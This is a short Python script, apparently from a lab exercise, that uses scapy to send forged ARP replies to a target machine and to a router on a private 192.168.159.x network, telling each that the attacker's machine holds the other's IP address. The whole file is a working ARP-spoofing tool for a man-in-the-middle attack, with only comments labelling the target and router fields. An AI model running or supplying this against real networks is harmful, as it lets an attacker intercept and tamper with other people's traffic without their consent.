import scapy.all as scapy
# Sending ARP Request to Target Machine
packet = scapy.ARP(op = 2,pdst="192.168.159.143",hwdst="00:0c:29:ab:ab:2b",psrc="192.168.159.2")
#                 Target Machine (IP ADDRESS) Target Machine (MAC ADDRESS) Router's IP ADDRESS

print(packet.show())
print(packet.summary())
scapy.send(packet)
#Sending ARP Request to Router
packet_r = scapy.ARP(op=2,pdst="192.168.159.2",hwdst="00:50:56:f4:39:90",psrc="192.168.159.143")
print(packet_r.show())
print(packet_r.summary())
scapy.send(packet_r)

